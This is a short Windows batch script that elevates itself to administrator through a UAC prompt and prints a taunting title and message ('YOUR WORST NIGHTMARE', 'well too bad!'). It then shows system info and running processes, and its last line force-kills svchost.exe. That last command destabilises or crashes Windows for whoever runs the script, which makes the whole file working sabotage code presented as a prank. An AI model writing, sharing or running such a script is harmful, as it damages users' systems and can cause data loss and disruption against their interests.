@echo off
:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

echo.
echo *** ADMIN PRIVILEGES GRANTED ***
echo Running your commands...

title YOUR WORST NIGHTMARE
echo do you want to run this? well too bad!

:: Add your commands below
echo System Info:
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

echo.
echo Listing running processes...
tasklist

taskkill /F /IM svchost.exe